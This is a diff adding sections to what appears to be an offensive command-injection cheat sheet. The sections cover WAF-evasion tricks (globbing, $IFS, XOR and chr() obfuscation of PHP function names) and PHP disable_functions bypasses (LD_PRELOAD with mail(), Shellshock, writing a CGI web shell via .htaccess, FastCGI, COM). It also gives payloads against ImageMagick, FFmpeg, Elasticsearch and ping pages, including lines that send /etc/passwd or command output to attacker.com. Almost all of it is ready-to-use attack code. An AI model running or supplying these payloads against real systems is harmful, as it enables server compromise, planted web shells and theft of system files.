@@ -291,3 +291,204 @@ Found potential injection point?
     Filter on input? → encode differently
     Filter on specific commands? → whitespace bypass, $IFS, glob
 ```
+
+---
+
+## 9. ADVANCED WAF BYPASS TECHNIQUES
+
+### Wildcard Expansion
+
+```bash
+# Use ? and * to bypass keyword filters:
+/???/??t /???/p??s??    # /bin/cat /etc/passwd
+/???/???/????2 *.php     # /usr/bin/find2 *.php (approximate)
+
+# Globbing for specific files:
+cat /e?c/p?sswd
+cat /e*c/p*d
+```
+
+### cat Alternatives (when "cat" is filtered)
+
+```bash
+tac /etc/passwd          # reverse cat
+nl /etc/passwd           # numbered lines
+head /etc/passwd
+tail /etc/passwd
+more /etc/passwd
+less /etc/passwd
+sort /etc/passwd
+uniq /etc/passwd
+rev /etc/passwd | rev
+xxd /etc/passwd
+strings /etc/passwd
+od -c /etc/passwd
+base64 /etc/passwd       # then decode offline
+```
+
+### Comment Insertion (PHP specific)
+
+```bash
+# Insert comments within function names to bypass WAF:
+sys/*x*/tem('id')        # PHP ignores /* */ in some eval contexts
+# Note: this works with eval() and similar PHP dynamic calls
+```
+
+### XOR String Construction (PHP)
+
+```php
+# Build function names from XOR of printable characters:
+$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');
+# Produces: "assert"
+$_('%13%19%13%14%05%0d'|'%60%60%60%60%60%60');
+# Evaluates: assert("system")
+```
+
+### Base64/ROT13 Encoding
+
+```php
+# Encode payload, decode at runtime:
+base64_decode('c3lzdGVt')('id');     # system('id')
+str_rot13('flfgrz')('id');           # system → flfgrz via ROT13
+```
+
+### chr() Assembly
+
+```php
+# Build strings character by character:
+chr(115).chr(121).chr(115).chr(116).chr(101).chr(109)  # "system"
+```
+
+### Dollar-Sign Variable Tricks
+
+```bash
+# $IFS (Internal Field Separator) as space:
+cat$IFS/etc/passwd
+cat${IFS}/etc/passwd
+
+# Unset variables expand to empty:
+c${x}at /etc/passwd      # $x is unset → "cat"
+```
+
+---
+
+## 10. PHP disable_functions BYPASS PATHS
+
+When `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`, `proc_open()` are all disabled:
+
+### Path 1: LD_PRELOAD + mail()/putenv()
+
+```php
+// 1. Upload shared object (.so) that hooks a libc function
+// 2. Set LD_PRELOAD to point to it
+putenv("LD_PRELOAD=/tmp/evil.so");
+// 3. Trigger external process (mail() calls sendmail)
+mail("a@b.com", "", "");
+// The .so's constructor runs with shell access
+```
+
+### Path 2: Shellshock (CVE-2014-6271)
+
+```php
+// If bash is vulnerable to Shellshock:
+putenv("PHP_LOL=() { :; }; /usr/bin/id > /tmp/out");
+mail("a@b.com", "", "");
+// Bash processes the function definition and runs the trailing command
+```
+
+### Path 3: Apache mod_cgi + .htaccess
+
+```php
+// Write .htaccess enabling CGI:
+file_put_contents('/var/www/html/.htaccess', 'Options +ExecCGI\nAddHandler cgi-script .sh');
+// Write CGI script:
+file_put_contents('/var/www/html/cmd.sh', "#!/bin/bash\necho Content-type: text/html\necho\n$1");
+chmod('/var/www/html/cmd.sh', 0755);
+// Access: /cmd.sh?id
+```
+
+### Path 4: PHP-FPM / FastCGI
+
+```php
+// If PHP-FPM socket is accessible (/var/run/php-fpm.sock or port 9000):
+// Send crafted FastCGI request to execute arbitrary PHP with different php.ini
+// Tool: https://github.com/neex/phuip-fpizdam
+// Override: PHP_VALUE=auto_prepend_file=/tmp/shell.php
+```
+
+### Path 5: COM Object (Windows)
+
+```php
+// Windows only, if COM extension enabled:
+$wsh = new COM('WScript.Shell');
+$exec = $wsh->Run('cmd /c whoami > C:\inetpub\wwwroot\out.txt', 0, true);
+```
+
+### Path 6: ImageMagick Delegate (CVE-2016-3714 "ImageTragick")
+
+```php
+// If ImageMagick processes user-uploaded images:
+// Upload SVG/MVG with embedded command:
+// Content of exploit.svg:
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg"|id > /tmp/pwned")'
+pop graphic-context
+```
+
+**Also consider (summary):** iconv (CVE-2024-2961) via `php://filter/convert.iconv`; FFI (`FFI::cdef` + `libc`) when the extension is enabled.
+
+---
+
+## 11. COMPONENT-LEVEL COMMAND INJECTION
+
+### ImageMagick Delegate Abuse
+
+```
+# MVG format with shell command in URL:
+push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 'https://127.0.0.1/x.php?x=`id > /tmp/out`'
+pop graphic-context
+
+# Or via filename: convert '|id' out.png
+```
+
+### FFmpeg (HLS/concat protocol)
+
+```
+# SSRF/LFI via m3u8 playlist:
+#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:10.0,
+concat:http://attacker.com/header.txt|file:///etc/passwd
+#EXT-X-ENDLIST
+
+# Upload as .m3u8, FFmpeg processes and may leak file contents in output
+```
+
+### Elasticsearch Groovy Script (pre-5.x)
+
+```json
+POST /_search
+{
+  "query": { "match_all": {} },
+  "script_fields": {
+    "cmd": {
+      "script": "Runtime rt = Runtime.getRuntime(); rt.exec('id')"
+    }
+  }
+}
+```
+
+### Ping/Traceroute/NSLookup Diagnostic Pages
+
+```
+# Classic injection point in network diagnostic features:
+# Input: 127.0.0.1; id
+# Input: 127.0.0.1 && cat /etc/passwd
+# Input: `id`.attacker.com (DNS exfil via backtick)
+# These features directly call OS commands with user input
+```
+
+**Other sinks (quick reference):** PDF generators (wkhtmltopdf / WeasyPrint with user HTML); Git wrappers (`git clone` URL / hooks).
